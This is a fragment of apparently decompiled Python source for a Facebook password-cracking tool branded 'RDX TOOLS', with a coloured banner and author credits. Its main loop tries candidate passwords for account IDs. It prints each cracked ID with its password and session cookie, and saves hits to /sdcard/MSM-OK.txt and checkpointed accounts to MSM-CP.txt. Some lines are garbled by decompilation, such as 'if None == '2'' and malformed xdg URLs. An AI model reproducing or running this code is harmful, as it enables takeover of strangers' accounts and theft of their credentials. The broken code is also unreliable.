...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/devilRDX.00')
        return None
    if None == '3':
        os.system('xdg-https://youtube.com/channel/UCI2A0fpKv3-Dqg4BIGTmhUw ')
        return None
...
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MEHEDI :* 3:) 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mR4H1D-404-C7B3R
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mToxic-Rahid
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m1.1
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO RDX TOOLS\33[0;m
 
\033[1;37m================== \33[32;45mRAHID\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MSM-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MSM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MSM-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MSM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MSM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
